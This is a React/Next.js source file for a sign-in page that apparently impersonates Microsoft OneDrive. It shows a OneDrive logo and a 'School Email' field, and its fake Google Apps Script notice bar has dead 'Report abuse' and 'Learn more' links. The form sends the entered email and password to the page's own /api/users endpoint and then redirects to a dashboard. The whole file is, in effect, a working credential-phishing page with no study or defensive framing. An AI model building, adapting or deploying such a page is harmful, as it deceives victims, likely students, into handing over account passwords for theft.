"use client";

import { useState } from "react";
import Toast from "@/components/Toast";

export default function SignInPage() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showInfoBar, setShowInfoBar] = useState(true);
  const [toast, setToast] = useState<{
    message: string;
    type: "success" | "error";
  } | null>(null);

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    // Validation
    if (!email || !password) {
      setError("Please enter both email and password.");
      return;
    }

    if (!validateEmail(email)) {
      setError("Please enter a valid email address.");
      return;
    }

    if (password.length < 6) {
      setError("Password must be at least 6 characters long.");
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch("/api/users", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password, rememberMe }),
      });

      const data = await response.json();

      if (!response.ok) {
        setError(data.error || "Login failed. Please try again.");
        return;
      }

      setToast({
        message: `Successfully registered as ${email}`,
        type: "success",
      });
      setTimeout(() => {
        window.location.href = "/dashboard";
      }, 1500);
    } catch (err) {
      setToast({
        message: "Login failed. Please check your credentials.",
        type: "error",
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#fcfcfc]">
      {toast && (
        <Toast
          message={toast.message}
          type={toast.type}
          onClose={() => setToast(null)}
        />
      )}
      {/* Top info bar - responsive */}
      {showInfoBar && (
        <div className="bg-[#e8f0fe] flex items-center px-3 sm:px-4 py-2 border-b border-[#e0e0e0]">
          <svg
            className="w-4 h-4 sm:w-5 sm:h-5 text-[#4285f4] mr-2 shrink-0"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <circle cx="12" cy="12" r="10" strokeWidth="2" />
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth="2"
              d="M12 8v4l3 3"
            />
          </svg>
          <span className="text-[#444] text-xs sm:text-sm flex-1 min-w-0 mr-2">
            This application was created by a Google Apps Script user
          </span>
          <div className="hidden md:flex gap-4 lg:gap-6 text-[#1a73e8] text-sm shrink-0">
            <a href="#" className="hover:underline">
              Report abuse
            </a>
            <a href="#" className="hover:underline">
              Learn more
            </a>
          </div>
          <button
            onClick={() => setShowInfoBar(false)}
            className="ml-2 sm:ml-4 text-[#5f6368] hover:bg-[#e0e0e0] rounded-full w-7 h-7 sm:w-8 sm:h-8 flex items-center justify-center shrink-0"
            aria-label="Close info bar"
          >
            <svg
              className="w-4 h-4 sm:w-5 sm:h-5"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>
      )}

      {/* Centered sign-in form, no box */}
      <div className="flex flex-1 items-center justify-center p-4 sm:p-6">
        <div className="w-full max-w-md flex flex-col items-center">
          {/* OneDrive logo */}
          <img
            src="/onedrive-logo.jpeg"
            alt="OneDrive"
            className="w-20 sm:w-24 mb-2"
            onError={(e) => {
              // Fallback if image doesn't load
              e.currentTarget.style.display = "none";
            }}
          />
          <div
            className="text-2xl sm:text-3xl font-bold mb-4 sm:mb-6 mt-2 text-center text-[#222]"
            style={{ letterSpacing: 0.5 }}
          >
            Sign In
          </div>
          <form
            className="w-full flex flex-col items-center"
            onSubmit={handleSubmit}
          >
            <div className="w-full mb-4">
              <input
                type="email"
                placeholder="School Email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border border-[#ccc] rounded px-3 sm:px-4 py-2 sm:py-2.5 text-base sm:text-lg focus:outline-none focus:border-[#4285f4] focus:ring-1 focus:ring-[#4285f4] transition-colors placeholder:text-[#444] text-[#222] font-normal"
                autoComplete="username"
                disabled={isLoading}
                style={{ background: "#fff" }}
              />
            </div>
            <div className="w-full mb-2 relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border border-[#ccc] rounded px-3 sm:px-4 py-2 sm:py-2.5 text-base sm:text-lg focus:outline-none focus:border-[#4285f4] focus:ring-1 focus:ring-[#4285f4] transition-colors placeholder:text-[#444] text-[#222] font-normal"
                autoComplete="current-password"
                disabled={isLoading}
                style={{ background: "#fff" }}
              />
            </div>
            <div className="w-full flex items-center mb-2">
              <input
                type="checkbox"
                id="show-password"
                className="mr-2 w-4 h-4 cursor-pointer"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
                disabled={isLoading}
              />
              <label
                htmlFor="show-password"
                className="text-sm text-[#222] cursor-pointer select-none"
              >
                Show Password
              </label>
            </div>
            <div className="w-full flex items-center mb-6">
              <input
                type="checkbox"
                id="remember-me"
                className="mr-2 w-4 h-4 cursor-pointer"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                disabled={isLoading}
              />
              <label
                htmlFor="remember-me"
                className="text-sm text-[#222] cursor-pointer select-none"
              >
                Remember Me
              </label>
            </div>
            {error && (
              <div className="w-full text-center text-xs sm:text-sm text-red-600 mb-3 bg-red-50 p-2 rounded border border-red-200">
                {error}
              </div>
            )}
            <button
              type="submit"
              disabled={isLoading}
              className="w-full bg-[#0067b8] text-white text-base sm:text-lg font-semibold rounded py-2.5 sm:py-3 mb-2 hover:bg-[#005a9e] transition-colors disabled:bg-[#ccc] disabled:cursor-not-allowed flex items-center justify-center"
            >
              {isLoading ? (
                <>
                  <svg
                    className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                    />
                  </svg>
                  Logging in...
                </>
              ) : (
                "Login"
              )}
            </button>
            <div className="w-full text-center text-xs sm:text-sm text-[#222] mt-2 space-y-1">
              <p>
                By logging in, you accept our{" "}
                <a href="#" className="text-[#1a73e8] hover:underline">
                  End User Terms of Use
                </a>
              </p>
              <a
                href="#"
                className="text-[#1a73e8] hover:underline inline-block mt-2"
              >
                Forgot Password?
              </a>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
